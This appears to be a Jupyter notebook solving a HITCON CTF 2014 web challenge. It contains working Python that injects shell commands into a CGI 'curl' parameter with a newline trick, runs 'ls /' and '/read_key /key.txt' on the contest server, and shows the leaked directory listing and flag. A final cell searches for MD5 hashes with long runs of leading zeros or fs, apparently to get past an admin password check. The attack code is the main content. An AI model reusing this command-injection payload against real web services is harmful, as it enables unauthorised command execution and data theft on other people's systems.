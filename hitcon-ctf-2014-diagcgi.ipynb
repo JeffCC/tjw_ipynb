{
 "metadata": {
  "name": "",
  "signature": "sha256:c8b198ed71a5cf331923d42173cfdaeb5de450a6f5a58feac6221b6ae9ba293c"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "headers = dict()\n",
      "headers = {'User-Agent': 'Mozilla/5.0'}\n",
      "cookies = {\"diagsess\":\"../etc/passwd\"} # doesn't matter\n",
      "cmd =\" ls /\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "bin\n",
        "boot\n",
        "dev\n",
        "etc\n",
        "home\n",
        "initrd.img\n",
        "key.txt\n",
        "lib\n",
        "lib64\n",
        "lost+found\n",
        "media\n",
        "mnt\n",
        "opt\n",
        "proc\n",
        "read_key\n",
        "root\n",
        "run\n",
        "sbin\n",
        "srv\n",
        "sys\n",
        "tmp\n",
        "usr\n",
        "var\n",
        "vmlinuz\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd = \"/read_key /key.txt\"\n",
      "# or use python to read stderr\n",
      "# cmd = \"python -c s=__import__('subprocess');print(s.check_output('/read_key'+chr(32)+'/key.txt',stderr=s.STDOUT,shell=True))\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "HITCON{a755be06b165ed8fc4710d3544fce942}\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# BTW, attempts to find an admin password\n",
      "# from http://calebmadrigal.com/display-list-as-table-in-ipython-notebook/\n",
      "class ListTable(list):\n",
      "    \"\"\" Overridden list class which takes a 2-dimensional list of \n",
      "        the form [[1,2,3],[4,5,6]], and renders an HTML Table in \n",
      "        IPython Notebook. \"\"\"\n",
      "    \n",
      "    def _repr_html_(self):\n",
      "        html = [\"<table>\"]\n",
      "        for row in self:\n",
      "            html.append(\"<tr>\")            \n",
      "            html.extend(\"<td>{0}</td>\".format(col) for col in row)            \n",
      "            html.append(\"</tr>\")\n",
      "        html.append(\"</table>\")\n",
      "        return ''.join(html)\n",
      "    \n",
      "from hashlib import md5\n",
      "L =[  \"djGFYmi\", \"ZkjAFaaaa\", \n",
      "          \"G/I2/vILur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "         \"Vf3ppC4Iu74AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "        \"6Za/F6+mur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA= \".decode(\"base64\"),\n",
      "          \"d3cc47d0c1\", \"066dff245a\", \"5de39642da\", \n",
      "         \"zBXl|Cc\", \"n&(tw8c\", '3z-C*Af', 'Dsnl/^g','tj=|2Dl', '+c-792o', \n",
      "         'Kdr.b4v', 'cOkR96A', 'K1UgX15KGWDJKTdo', 'xIoN=JG']\n",
      "L+=[ 'b81.org/Z*ahT&d', 'b81.org/blNXHYf', 'b81.org/kpoz&AV' , 'b81.org/GD9FD&Sa', 'b81.org/jhfBtZga']\n",
      "S = sorted( (md5(x).hexdigest(), x) for x in L )\n",
      "ListTable([['Leading 0 or f', 'md5 hexdigest', 'plaintext']]+[[[i for i in range(len(s[0])-1) if s[0][i]!=s[0][i+1]][0]+1, s[0], repr(s[1])] for s in S])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<table><tr><td>Leading 0 or f</td><td>md5 hexdigest</td><td>plaintext</td></tr><tr><td>12</td><td>0000000000006c32a237fc882cc44a4b</td><td>'U\\xfd\\xe9\\xa4.\\x08\\xbb\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>12</td><td>0000000000008d003b0ffcf6b666342e</td><td>'xIoN=JG'</td></tr><tr><td>11</td><td>00000000000277ec3301b3cabacb95c9</td><td>'\\x1b\\xf26\\xfe\\xf2\\x0b\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>11</td><td>00000000000639f3eb26b63f0a7baca3</td><td>'ZkjAFaaaa'</td></tr><tr><td>11</td><td>00000000000b814f9865b26c0ebb4136</td><td>'Kdr.b4v'</td></tr><tr><td>11</td><td>00000000000ccda838e4b06d6d662dca</td><td>'djGFYmi'</td></tr><tr><td>10</td><td>000000000016deedb58402856305e702</td><td>'b81.org/GD9FD&Sa'</td></tr><tr><td>10</td><td>00000000003214b3704464e7a572cc98</td><td>'b81.org/Z*ahT&d'</td></tr><tr><td>10</td><td>00000000003764dd4ef1af5ffd793969</td><td>'n&(tw8c'</td></tr><tr><td>10</td><td>000000000073e0211102fd6bf4ffeddb</td><td>'066dff245a'</td></tr><tr><td>10</td><td>0000000000a23e0c9d184e6d884cf3be</td><td>'d3cc47d0c1'</td></tr><tr><td>10</td><td>0000000000f3b9336bffd6a6ff553aff</td><td>'zBXl|Cc'</td></tr><tr><td>10</td><td>ffffffffff4d9d147e999567d7715f3e</td><td>'b81.org/jhfBtZga'</td></tr><tr><td>10</td><td>ffffffffff8981c45af8396b5463cd3a</td><td>'3z-C*Af'</td></tr><tr><td>10</td><td>ffffffffff9a8432b20486b3448eacf5</td><td>'Dsnl/^g'</td></tr><tr><td>10</td><td>ffffffffffbc344e67ebe6bf9d4bae95</td><td>'b81.org/blNXHYf'</td></tr><tr><td>10</td><td>ffffffffffbd2803dda13ef7f1dea7ac</td><td>'tj=|2Dl'</td></tr><tr><td>10</td><td>ffffffffffbd4e5561275deaf83b5756</td><td>'5de39642da'</td></tr><tr><td>10</td><td>ffffffffffbf5007c941a36a521d3d47</td><td>'+c-792o'</td></tr><tr><td>10</td><td>ffffffffffde7ad85570b919f365b035</td><td>'cOkR96A'</td></tr><tr><td>11</td><td>fffffffffff5d05f4b93da2870f43376</td><td>'K1UgX15KGWDJKTdo'</td></tr><tr><td>11</td><td>fffffffffff8821c53918df398cda5d8</td><td>'b81.org/kpoz&AV'</td></tr><tr><td>12</td><td>ffffffffffff4de6f952846ffc0f4d15</td><td>'\\xe9\\x96\\xbf\\x17\\xaf\\xa6\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr></table>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 6,
       "text": [
        "[['Leading 0 or f', 'md5 hexdigest', 'plaintext'],\n",
        " [12,\n",
        "  '0000000000006c32a237fc882cc44a4b',\n",
        "  \"'U\\\\xfd\\\\xe9\\\\xa4.\\\\x08\\\\xbb\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [12, '0000000000008d003b0ffcf6b666342e', \"'xIoN=JG'\"],\n",
        " [11,\n",
        "  '00000000000277ec3301b3cabacb95c9',\n",
        "  \"'\\\\x1b\\\\xf26\\\\xfe\\\\xf2\\\\x0b\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [11, '00000000000639f3eb26b63f0a7baca3', \"'ZkjAFaaaa'\"],\n",
        " [11, '00000000000b814f9865b26c0ebb4136', \"'Kdr.b4v'\"],\n",
        " [11, '00000000000ccda838e4b06d6d662dca', \"'djGFYmi'\"],\n",
        " [10, '000000000016deedb58402856305e702', \"'b81.org/GD9FD&Sa'\"],\n",
        " [10, '00000000003214b3704464e7a572cc98', \"'b81.org/Z*ahT&d'\"],\n",
        " [10, '00000000003764dd4ef1af5ffd793969', \"'n&(tw8c'\"],\n",
        " [10, '000000000073e0211102fd6bf4ffeddb', \"'066dff245a'\"],\n",
        " [10, '0000000000a23e0c9d184e6d884cf3be', \"'d3cc47d0c1'\"],\n",
        " [10, '0000000000f3b9336bffd6a6ff553aff', \"'zBXl|Cc'\"],\n",
        " [10, 'ffffffffff4d9d147e999567d7715f3e', \"'b81.org/jhfBtZga'\"],\n",
        " [10, 'ffffffffff8981c45af8396b5463cd3a', \"'3z-C*Af'\"],\n",
        " [10, 'ffffffffff9a8432b20486b3448eacf5', \"'Dsnl/^g'\"],\n",
        " [10, 'ffffffffffbc344e67ebe6bf9d4bae95', \"'b81.org/blNXHYf'\"],\n",
        " [10, 'ffffffffffbd2803dda13ef7f1dea7ac', \"'tj=|2Dl'\"],\n",
        " [10, 'ffffffffffbd4e5561275deaf83b5756', \"'5de39642da'\"],\n",
        " [10, 'ffffffffffbf5007c941a36a521d3d47', \"'+c-792o'\"],\n",
        " [10, 'ffffffffffde7ad85570b919f365b035', \"'cOkR96A'\"],\n",
        " [11, 'fffffffffff5d05f4b93da2870f43376', \"'K1UgX15KGWDJKTdo'\"],\n",
        " [11, 'fffffffffff8821c53918df398cda5d8', \"'b81.org/kpoz&AV'\"],\n",
        " [12,\n",
        "  'ffffffffffff4de6f952846ffc0f4d15',\n",
        "  \"'\\\\xe9\\\\x96\\\\xbf\\\\x17\\\\xaf\\\\xa6\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"]]"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}